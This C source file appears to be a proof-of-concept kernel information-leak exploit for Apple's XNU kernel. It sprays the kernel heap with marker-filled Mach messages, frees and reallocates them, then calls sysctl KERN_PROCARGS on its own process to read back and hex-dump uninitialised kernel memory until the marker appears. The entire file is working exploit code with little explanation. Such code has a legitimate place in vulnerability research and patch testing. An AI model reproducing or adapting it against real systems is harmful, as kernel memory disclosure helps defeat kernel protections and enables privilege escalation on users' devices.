#include <mach/mach.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <errno.h>
#include <stdbool.h>

int main() {
#define MY_PAGE_SIZE 0x4000
#define LEAK_MACH_MSG_SIZE (MY_PAGE_SIZE*4+MY_PAGE_SIZE)
#define PIPEBUFFER_SIZE 0x10000
#define HOW_MANY_PIPEBUFFERS 3
#define LEAK_SIZE 0x200
	int tries = 0;
	while (1) {
	tries++;
	int error;

	// create the mach msg
	typedef struct {
		mach_msg_header_t head;
	} spray_mach_msg_t;
	spray_mach_msg_t * spray_msg = malloc(LEAK_MACH_MSG_SIZE);
	memset(spray_msg,0,LEAK_MACH_MSG_SIZE);
	spray_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
	spray_msg->head.msgh_local_port = MACH_PORT_NULL;
	spray_msg->head.msgh_size = LEAK_MACH_MSG_SIZE;

	unsigned char * pattern = ((void*)spray_msg);
	for (int i = sizeof(spray_mach_msg_t); i < LEAK_MACH_MSG_SIZE; i++) {
		pattern[i] = (tries&0xff);
	}

	// perpare the buffer for the leak, we wanna be fast
	unsigned char * leaked_kernel_mem = malloc(LEAK_SIZE);
	memset(leaked_kernel_mem,0,LEAK_SIZE);

	// create a port
	mach_port_t msg_port;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_port);
	spray_msg->head.msgh_remote_port = msg_port;

	// send mach msgs to the port (we will go with 3)
	for (int i = 0; i < 5; i++) {
		if((error = mach_msg(&spray_msg->head,MACH_SEND_MSG,spray_msg->head.msgh_size,0,0,0,0))) {
			printf("mach_msg failed %d\n",error);
		}
	}
	
	// destroy the port which will free all the mach msgs
	mach_port_destroy(mach_task_self(),msg_port);

	spray_msg->head.msgh_size = LEAK_MACH_MSG_SIZE-MY_PAGE_SIZE;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_port);
	spray_msg->head.msgh_remote_port = msg_port;

	// send mach msgs to the port (we will go with 3)
	for (int i = 0; i < 5; i++) {
		if((error = mach_msg(&spray_msg->head,MACH_SEND_MSG,spray_msg->head.msgh_size,0,0,0,0))) {
			printf("mach_msg failed %d\n",error);
		}
	}

	
	for (int z = 0; z < 10; z++) {
		// try to leak using the sysctl stuff
		size_t oldlenp = LEAK_SIZE;
		int mib[3];
		mib[0] = CTL_KERN;
		mib[1] = KERN_PROCARGS;
		mib[2] = getpid();
		if((error = sysctl(mib,3,leaked_kernel_mem,&oldlenp,NULL,0))) {
			printf("sysctl failed %d %d\n",error,errno);
		}
		printf("Got (try:%d searching %x diff: %d):",tries,tries&0xff,(tries&0xff)-leaked_kernel_mem[0]);
		// check if we got something which looks like our mach msg back, if not, go back to `create a port`
		int found = 0;
		for (int i = 0; i < LEAK_SIZE; i++) {
			if (i % 0x10 == 0) {printf("\n");}
			if (leaked_kernel_mem[i] == (tries & 0xff)) {
				found++;
				if (found == 50) {printf("%d tries\n",tries);return 0;}
			}else{found = 0;}
			printf("%02x ",leaked_kernel_mem[i]);
		}
		printf("\n");
	}
	
	mach_port_destroy(mach_task_self(),msg_port);
	free(spray_msg);
	free(leaked_kernel_mem);
	}
	return 0;
}
